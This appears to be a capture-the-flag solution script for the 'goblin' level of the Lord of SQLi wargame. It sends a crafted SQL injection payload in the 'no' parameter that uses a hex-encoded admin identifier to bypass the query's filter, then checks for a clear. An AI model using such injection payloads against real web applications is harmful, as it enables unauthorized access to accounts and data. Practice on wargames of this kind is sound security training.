from constants import *

chall_url = "https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php"

res = make_request(chall_url, "?no=" + urllib.parse.quote(f"1 and no=2 or id={admin_in_hex}"))
check_clear(res)
